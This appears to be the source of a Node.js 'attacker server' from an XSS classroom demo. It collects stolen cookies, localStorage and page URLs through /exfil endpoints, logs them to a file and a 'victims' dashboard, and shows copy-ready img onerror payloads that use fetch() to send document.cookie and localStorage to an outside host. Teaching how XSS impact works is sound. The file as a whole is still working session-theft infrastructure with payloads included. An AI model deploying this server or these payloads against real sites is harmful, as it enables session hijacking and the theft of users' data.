const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 4000;  // Different port from vulnerable app

// Store stolen data in memory
const stolenData = [];

app.use(express.json({ limit: '10mb' }));

// ===== EXFILTRATION ENDPOINT =====
// This simulates an attacker-controlled server receiving stolen data

app.get('/exfil', (req, res) => {
  const timestamp = new Date().toISOString();
  const data = {
    timestamp,
    method: 'GET',
    query: req.query,
    headers: {
      'user-agent': req.headers['user-agent'],
      'referer': req.headers['referer'],
      'origin': req.headers['origin']
    },
    ip: req.ip
  };
  
  stolenData.push(data);
  
  // Log to console
  console.log('\n🚨 STOLEN DATA RECEIVED (GET):');
  console.log('Time:', timestamp);
  console.log('Data:', req.query);
  console.log('Referer:', req.headers['referer']);
  
  // Log to file
  fs.appendFileSync('attacker.log', 
    `\n[${ timestamp}] GET - ${JSON.stringify(data, null, 2)}\n` + 
    '='.repeat(80) + '\n'
  );
  
  // Return 1x1 transparent pixel (so the img tag doesn't show broken image)
  res.set('Content-Type', 'image/gif');
  res.send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
});

app.post('/exfil', (req, res) => {
  const timestamp = new Date().toISOString();
  const data = {
    timestamp,
    method: 'POST',
    body: req.body,
    headers: {
      'user-agent': req.headers['user-agent'],
      'referer': req.headers['referer'],
      'origin': req.headers['origin']
    },
    ip: req.ip
  };
  
  stolenData.push(data);
  
  // Log to console with colors
  console.log('\n🚨 STOLEN DATA RECEIVED (POST):');
  console.log('Time:', timestamp);
  console.log('Cookie:', req.body.cookie);
  console.log('LocalStorage:', req.body.localStorage);
  console.log('URL:', req.body.url);
  console.log('Referer:', req.headers['referer']);
  
  // Log to file
  fs.appendFileSync('attacker.log', 
    `\n[${timestamp}] POST - ${JSON.stringify(data, null, 2)}\n` + 
    '='.repeat(80) + '\n'
  );
  
  res.json({ success: true, message: 'Data received' });
});

// ===== DASHBOARD ENDPOINT =====
// Shows all stolen data in a web interface

app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🏴‍☠️ Attacker Dashboard</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body { 
      background: #1a1a1a; 
      color: #ffffff; 
      font-family: 'Courier New', monospace;
    }
    .container { max-width: 1200px; }
    .card { 
      background: #2a2a2a; 
      border: 1px solid #00ff00;
      margin-bottom: 1rem;
    }
    .card-header { 
      background: #000; 
      color: #00ff00;
      border-bottom: 1px solid #00ff00;
    }
    .stolen-item {
      background: #1a1a1a;
      border: 1px solid #00ff00;
      padding: 1rem;
      margin-bottom: 1rem;
      border-radius: 5px;
    }
    .timestamp { color: #ffaa00; }
    .method-get { color: #00aaff; }
    .method-post { color: #ff00ff; }
    .cookie { color: #ff5555; }
    .url { color: #55ff55; }
    pre { 
      background: #000; 
      color: #ffffff; 
      padding: 1rem; 
      border-radius: 5px;
      overflow-x: auto;
    }
    .skull { font-size: 3rem; }
    .blink {
      animation: blink 1s infinite;
    }
    @keyframes blink {
      0%, 50%, 100% { opacity: 1; }
      25%, 75% { opacity: 0; }
    }
    .stats {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 1rem;
      margin-bottom: 2rem;
    }
    .stat-card {
      background: #000;
      border: 2px solid #00ff00;
      padding: 1.5rem;
      text-align: center;
      border-radius: 5px;
    }
    .stat-number {
      font-size: 2.5rem;
      font-weight: bold;
      color: #ff0000;
    }
    .stat-label {
      color: #00ff00;
      font-size: 0.9rem;
    }
    .payload-container {
      position: relative;
      margin-bottom: 1rem;
    }
    .copy-btn {
      position: absolute;
      top: 0.5rem;
      right: 0.5rem;
      padding: 0.25rem 0.5rem;
      font-size: 0.75rem;
      background: #00ff00;
      color: #000;
      border: none;
      border-radius: 3px;
      cursor: pointer;
      font-family: 'Courier New', monospace;
    }
    .copy-btn:hover {
      background: #00cc00;
    }
    .copy-btn.copied {
      background: #ff00ff;
      color: #fff;
    }
  </style>
</head>
<body>
  <div class="container py-4">
    <div class="text-center mb-4">
      <div class="skull">☠️</div>
      <h1 class="blink">ATTACKER DASHBOARD</h1>
      <p class="text-warning">Exfiltrated Data Collection Server</p>
      <p class="text-muted small">Running on: http://localhost:${PORT}</p>
    </div>

    <!-- Stats -->
    <div class="stats">
      <div class="stat-card">
        <div class="stat-number" id="totalCount">${stolenData.length}</div>
        <div class="stat-label">TOTAL VICTIMS</div>
      </div>
      <div class="stat-card">
        <div class="stat-number" id="sessionCount">${stolenData.filter(d => d.body?.cookie).length}</div>
        <div class="stat-label">SESSIONS STOLEN</div>
      </div>
      <div class="stat-card">
        <div class="stat-number" id="cookieCount">${stolenData.filter(d => d.query?.data || d.body?.cookie).length}</div>
        <div class="stat-label">COOKIES CAPTURED</div>
      </div>
    </div>

    <!-- Stolen Data Display -->
    <div class="card">
      <div class="card-header">
        <div class="d-flex justify-content-between align-items-center">
          <strong>📡 EXFILTRATED DATA (${stolenData.length} entries)</strong>
          <button class="btn btn-sm btn-outline-danger" onclick="clearData()">🗑️ Clear All</button>
        </div>
      </div>
      <div class="card-body" id="dataContainer">
        ${stolenData.length === 0 ? 
          '<p class="text-center text-muted">No data stolen yet. Waiting for victims...</p>' :
          stolenData.slice().reverse().map((item, index) => `
            <div class="stolen-item">
              <div class="d-flex justify-content-between mb-2">
                <strong class="timestamp">⏰ ${item.timestamp}</strong>
                <span class="badge ${item.method === 'POST' ? 'method-post bg-primary' : 'method-get bg-info'}">${item.method}</span>
              </div>
              
              ${item.body?.cookie ? `
                <div class="mb-2">
                  <strong class="cookie">🍪 COOKIE:</strong>
                  <pre class="mb-1">${item.body.cookie}</pre>
                </div>
              ` : ''}
              
              ${item.body?.localStorage ? `
                <div class="mb-2">
                  <strong class="text-warning">💾 LOCAL STORAGE:</strong>
                  <pre class="mb-1">${item.body.localStorage}</pre>
                </div>
              ` : ''}
              
              ${item.body?.url || item.query?.data ? `
                <div class="mb-2">
                  <strong class="url">🔗 ${item.body?.url ? 'VICTIM URL' : 'STOLEN DATA'}:</strong>
                  <pre class="mb-1">${item.body?.url || item.query?.data}</pre>
                </div>
              ` : ''}
              
              ${Object.keys(item.query || {}).length > 0 ? `
                <div class="mb-2">
                  <strong class="text-info">📋 QUERY PARAMS:</strong>
                  <pre class="mb-1">${JSON.stringify(item.query, null, 2)}</pre>
                </div>
              ` : ''}
              
              <div class="small text-muted">
                <strong>🌐 Referer:</strong> ${item.headers.referer || 'N/A'}<br>
                <strong>🖥️ User-Agent:</strong> ${item.headers['user-agent'] || 'N/A'}<br>
                <strong>📍 IP:</strong> ${item.ip}
              </div>
            </div>
          `).join('')
        }
      </div>
    </div>

    <!-- Instructions -->
    <div class="card mt-4">
      <div class="card-header">
        <strong>📚 HOW TO USE THIS DASHBOARD</strong>
      </div>
      <div class="card-body">
        <ol>
          <li>Update XSS payloads to point to: <code>https://project-1-17.eduhk.hk/exfil</code></li>
          <li>Post the payload in the vulnerable app's comment board</li>
          <li>When victims view the page, their data appears here automatically</li>
          <li>This page auto-refreshes every 3 seconds to show new victims</li>
        </ol>
        
        <div class="mt-3">
          <strong class="text-warning">🎯 Example Payloads (click to copy):</strong>
          
          <div class="payload-container">
            <button class="copy-btn" onclick="copyPayload(this, 0)">📋 COPY</button>
            <pre id="payload-0">&lt;img src=x onerror="fetch('https://project-1-17.eduhk.hk/exfil?data='+document.cookie)"&gt;</pre>
          </div>
          
          <div class="payload-container">
            <button class="copy-btn" onclick="copyPayload(this, 1)">📋 COPY</button>
            <pre id="payload-1">&lt;img src=x onerror="fetch('https://project-1-17.eduhk.hk/exfil',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:document.cookie,localStorage:JSON.stringify(localStorage),url:location.href})})"&gt;</pre>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script>
    // Copy payload to clipboard
    function copyPayload(button, payloadId) {
      const pre = document.getElementById('payload-' + payloadId);
      const text = pre.textContent;
      
      navigator.clipboard.writeText(text).then(() => {
        button.textContent = '✅ COPIED!';
        button.classList.add('copied');
        
        setTimeout(() => {
          button.textContent = '📋 COPY';
          button.classList.remove('copied');
        }, 2000);
      }).catch(err => {
        console.error('Failed to copy:', err);
        alert('Failed to copy. Please copy manually.');
      });
    }
    
    // Auto-refresh every 3 seconds
    setInterval(() => {
      location.reload();
    }, 3000);
    
    function clearData() {
      if (confirm('Clear all stolen data?')) {
        fetch('/clear', { method: 'POST' })
          .then(() => location.reload());
      }
    }
  </script>
</body>
</html>
  `);
});

// Clear all data endpoint
app.post('/clear', (req, res) => {
  stolenData.length = 0;
  console.log('\n🗑️ All stolen data cleared');
  res.json({ success: true });
});

// Get data as JSON (for API access)
app.get('/api/stolen', (req, res) => {
  res.json({ count: stolenData.length, data: stolenData });
});

app.listen(PORT, () => {
  console.log(`
╔════════════════════════════════════════════════════════════════╗
║                                                                ║
║         🏴‍☠️  ATTACKER SERVER - EXFILTRATION ENDPOINT  🏴‍☠️        ║
║                                                                ║
║   Dashboard: http://localhost:${PORT}                            ║
║   Exfil Endpoint: http://localhost:${PORT}/exfil                ║
║   API: http://localhost:${PORT}/api/stolen                       ║
║                                                                ║
║   📝 Logs saved to: attacker.log                               ║
║                                                                ║
║   ⚠️  EDUCATIONAL DEMO - Shows stolen session data in          ║
║   real-time. Students can see the impact of XSS attacks!       ║
║                                                                ║
╚════════════════════════════════════════════════════════════════╝

🎯 Update your XSS payloads to use:
   http://localhost:${PORT}/exfil

📊 View stolen data dashboard:
   http://localhost:${PORT}

🔄 Dashboard auto-refreshes every 3 seconds
  `);
});

module.exports = app;
